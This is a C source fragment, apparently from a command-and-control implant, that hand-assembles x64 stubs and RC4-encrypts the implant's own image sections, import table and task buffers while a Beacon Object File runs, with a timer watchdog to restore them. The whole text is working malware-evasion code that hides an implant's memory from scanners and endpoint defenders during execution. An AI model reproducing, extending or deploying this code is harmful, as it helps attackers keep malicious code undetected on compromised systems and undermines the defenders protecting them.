		bw_put32(p + jne_at + 2, tail_at - jne_at - 6);
		if ((int)(e - (p + BW_EXIT_OFF)) > 0x90)
			BW_BUILD_FAIL();
	}

	/* ---- watchdog_stub (timer callback, rsp%16==8; fires mid-BOF) ----
	 * same claim+refresh+rc4+VP+flush (sub 0x28 first: alignment for the
	 * VP/flush calls), then reload + mov rcx,rax + tail-jump into the C
	 * rest-unmask. wd_ret: ret
	 */
	{
		int jne_at, ret_at;
		e = p + BW_WATCH_OFF;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
		e += 5;
		e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
		e += 2;
		e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
		e += 3;
		jne_at = (int)(e - p);
		e[0] = 0x0F; e[1] = 0x85;                                        /* jne rel32 wd_ret (patched) */
		e = bw_put32(e + 2, 0);
		e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
		e += 4;
		e += bw_emit_refresh(e, bw_disp((int)(e - p) + 9, BW_SB0Q_OFF),
		                        bw_disp((int)(e - p) + 16, BW_SB1Q_OFF));
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
		e += 4;
		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
		e += 3;
		e[0] = 0xE8;                                                     /* call rc4_prga */
		e = bw_put32(e + 1, BW_RC4_OFF - (int)(e - p) - 5);
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
		e += 4;
		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
		e += 3;
		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* r8d = [rax+0x74] orig */
		e = bw_put32(e + 3, 0x74);
		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* r9 = &vp_old */
		e += 4;
		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x88] VP */
		e += 6;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* rcx=-1 */
		e += 7;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* rdx = buf */
		e += 4;
		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x40; e[3] = 0x50;            /* r8d = len32 */
		e += 4;
		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x90; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x90] flush */
		e += 6;
		e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
		e += 4;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0x48; e[1] = 0x89; e[2] = 0xC1;                          /* mov rcx,rax */
		e += 3;
		e[0] = 0xFF; e[1] = 0x25;                                        /* jmp qword [rip+0] */
		{
			unsigned long long rest = (unsigned long long)(size_t)bw_watchdog_rest;
			memcpy(e + 6, &rest, 8); /* data qword sits at the instruction end */
		}
		e += 14;
		ret_at = (int)(e - p);
		e[0] = 0xC3;                                                     /* wd_ret: ret */
		e += 1;
		bw_put32(p + jne_at + 2, ret_at - jne_at - 6);
		if ((int)(e - (p + BW_WATCH_OFF)) > 0xA0)
			BW_BUILD_FAIL();
	}

	/* the page-local PRGA + the qwords all stubs load rip-relatively */
	memcpy(p + BW_RC4_OFF, BW_RC4_CODE, sizeof(BW_RC4_CODE));
	bw_put64(p + BW_CTXQ_OFF, (unsigned long long)(size_t)g_bw_ctx);
	bw_put64(p + BW_SB0Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox0);
	bw_put64(p + BW_SB1Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox1);

	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
		BW_BUILD_FAIL();
	FlushInstructionCache(GetCurrentProcess(), p, 0x1000);
#undef BW_BUILD_FAIL
	return TRUE;
}

BOOL bofwin_supported(void)
{
	return bw_build_pages();
}

BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
{
	BW_SF032 fn;
	BW_CTX * ctx;                 /* stack-local: g_bw_ctx itself sits in
	                               * .data and is ciphertext after the mask */
	BW_BLOCK * blocks;
	int nblocks, text_idx, i;
	unsigned char key[16];
		unsigned char * args_copy = NULL;
		HANDLE timer = NULL;
		void (*enter_fn)(void);
		BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *);
		BOOL (*pFlush)(void *, const void *, SIZE_T);
		BOOL (*pDelTimer)(void *, void *, void *);
		unsigned int * k = (unsigned int *)key;

	/* a background job thread could execute beacon code while the image is
	 * ciphertext - the window is single-threaded only (same guard as the
	 * gen3 sleep path). gparms must already be initialized by the caller
	 * (boff.cpp mirrors gen3_sleep's lazy gargle_setup_parms). */
	if (entry == NULL || threadcount > 0 || gparms == NULL || gparms->beacon_ptr == NULL)
		return FALSE;
	if (!bw_build_pages())
		return FALSE;
	fn = bw_sf032_resolve();
	if (fn == NULL)
		return FALSE;
	BW_TRACE("resolved sf032");

	/* capture every engine pointer BEFORE any masking: after the mask
	 * loop, this function's only legal memory accesses are its own stack
	 * and the (never-masked) private ctx/stub pages */
	ctx = g_bw_ctx;
	blocks = (BW_BLOCK *)ctx->storage;
	nblocks = bw_snapshot(blocks, BW_MAX_BLOCKS, gparms->beacon_ptr, &text_idx);
	if (nblocks < 2 || text_idx < 0)
		return FALSE;
	if (crypto_rng_get_bytes(key, (unsigned long)sizeof(key)) == 0)
		return FALSE;
	BW_TRACE("snapshot+rng done");

		pVP = VirtualProtect;
		pFlush = FlushInstructionCache;
		pDelTimer = (BOOL (WINAPI *)(void *, void *, void *))(void *)DeleteTimerQueueTimer;
		/* capture the stub address NOW - g_bw_stubs lives in .data and is
		 * ciphertext after the mask loop. */
		enter_fn = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);

	ctx->state = BW_STATE_OPEN;
	ctx->rest_done = 0;
	memcpy(ctx->key, key, 16);
	ctx->sf032 = fn;
	ctx->entry = entry;
	ctx->args = args;
	ctx->alen = alen;
	ctx->blocks = blocks;
	ctx->nblocks = nblocks;
	ctx->text_idx = text_idx;
	ctx->text_prot = blocks[text_idx].orig_prot;
	ctx->vp_old = 0;
	ctx->pVirtualProtect = pVP;
	ctx->pFlushIC = pFlush;
	ctx->phase = 0;
	ctx->u_text.Buffer = blocks[text_idx].ptr;
	ctx->u_text.Length = ctx->u_text.MaximumLength = blocks[text_idx].len;
	ctx->u_key.Buffer = ctx->key;
	ctx->u_key.Length = ctx->u_key.MaximumLength = 16;
	/* the stub-side PRGA state: KSA in plaintext C, pristine copy in
	 * sbox0 (exit/watchdog rep-movsq it over sbox1 before unmasking) */
	bw_kasa(ctx->sbox0, key, (unsigned int)text_idx);
	memcpy(ctx->sbox1, ctx->sbox0, 256);

	/* The args blob points into the tracked task buffer (beacon.cpp's
	 * MAX_GET malloc, track_memory_add'd) - the mask loop below turns
	 * that whole buffer into ciphertext, so a BOF that reads its
	 * arguments mid-window would read RC4 garbage. Hand it a private
	 * plaintext copy instead: plain VirtualAlloc, never tracked, so it
	 * never joins the mask list. Wiped+freed only after the teardown,
	 * once the IAT is plaintext again. */
	if (args != NULL && alen > 0) {
		args_copy = (unsigned char *)VirtualAlloc(NULL, (SIZE_T)alen,
		                                         MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (args_copy == NULL)
			return FALSE; /* nothing masked yet, no timer yet */
		memcpy(args_copy, args, (SIZE_T)alen);
		ctx->args = args_copy;
	}

	/* the watchdog is created BEFORE the mask loop: its IAT entry lives in
	 * .rdata, which is ciphertext from the mask on. One-shot, min 50ms -
	 * the mask loop takes microseconds, it can never fire early. */
	if (watchdog_ms < 50)
		watchdog_ms = (watchdog_ms == 0) ? BW_DEFAULT_WATCHDOG_MS : 50;
	if (!CreateTimerQueueTimer(&timer, NULL,
	                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
	                           NULL, watchdog_ms, 0,
	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
		if (args_copy != NULL)
			VirtualFree(args_copy, 0, MEM_RELEASE); /* nothing masked yet */
		return FALSE; /* no watchdog -> no window (nothing masked yet) */
	}
	BW_TRACE("watchdog timer armed");

	/* flip each non-.text block to RW and mask it in one pass; .text stays
	 * plaintext and executable until enter_stub */
	for (i = 0; i < nblocks; i++) {
		DWORD oldp = 0;
		if (i == text_idx)
			continue;
		/* ctx->pVirtualProtect, NOT the pVP local: /O1 const-folds the
		 * local (pVP = VirtualProtect) back into call [__imp_VirtualProtect]
		 * - once an earlier block masked .rdata that indirect call reads
		 * ciphertext and jumps to garbage (crash 7, spwizimg+0x15c79).
		 * The ctx-page load is opaque to the optimizer. */
		if (!ctx->pVirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &oldp)) {
			int j;
			/* blocks 0..i-1 are ciphertext and .rdata may be among them:
			 * decrypt BEFORE touching the protections - bw_blocks_restore's
			 * indirect call runs through the .text import thunk, which
			 * dereferences the (still masked) IAT otherwise */
			for (j = 0; j < i; j++) {
				if (j != text_idx)
					bw_rc4(fn, blocks[j].ptr, blocks[j].len, ctx->key2, key, (unsigned int)j);
			}
			bw_blocks_restore(blocks, nblocks, text_idx, pVP);
			bw_call_deltimer(pDelTimer, NULL, timer, NULL);
			if (args_copy != NULL) {
				memset(args_copy, 0, (SIZE_T)alen);
				VirtualFree(args_copy, 0, MEM_RELEASE);
			}
			ctx->state = BW_STATE_IDLE;
			return FALSE;
		}
		ctx->phase = 10 + i;
		bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
	}
	ctx->phase = 2; /* all but .text masked; the stubs run API-free now (the
	                 * page PRGA replaced SystemFunction032 after the round-4
	                 * CNG crash), but keep the no-IAT discipline anyway */

	/* from here to the exit stub this thread may only touch: stack, ctx
	 * page, stub page. enter_stub flips .text to RW, masks it via the page
	 * PRGA (last block), enters the BOF; the BOF's ret -> exit_stub
	 * restores .text + RX and returns into THIS frame. */
		bw_call_enter(enter_fn);
	ctx->phase = 4; /* exit stub returned to this frame - no trace here,
	                 * .rdata (and the IAT) is still ciphertext */

	/* .text is plaintext+RX again (exit_stub, or the watchdog won and
	 * exit_stub saw state==CLOSED). The image except .text is still
	 * ciphertext here - unmask it via the stack-local ctx, restore the
	 * remaining protections, THEN touch any IAT. */
	if (InterlockedExchange(&ctx->rest_done, 1) == 0) {
		for (i = 0; i < nblocks; i++) {
			if (i != text_idx) {
				ctx->phase = 40 + i;
				bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
			}
		}
	}
	bw_blocks_restore(blocks, nblocks, text_idx, pVP);
	ctx->phase = 6;
	bw_call_deltimer(pDelTimer, NULL, timer, NULL);
	ctx->phase = 7;
	if (args_copy != NULL) {
		memset(args_copy, 0, (SIZE_T)alen);
		VirtualFree(args_copy, 0, MEM_RELEASE);
		ctx->args = NULL;
	}
	BW_TRACE("window complete"); /* IAT alive again: everything unmasked */

	memset(key, 0, sizeof(key));
	memset(ctx->key, 0, 16);
	memset(ctx->key2, 0, 16);
	memset(ctx->sbox0, 0, 256);
	memset(ctx->sbox1, 0, 256);
	memset(ctx->storage, 0, sizeof(ctx->storage));
	ctx->state = BW_STATE_IDLE;
	ctx->phase = 8;
	(void)k;
	return TRUE;
}

#else /* !_M_X64: x86 keeps the sleeve small - no window, plain BOF */

BOOL bofwin_supported(void)
{
	return FALSE;
}

BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
{
	(void)entry; (void)args; (void)alen; (void)watchdog_ms;
	return FALSE;
}

#endif
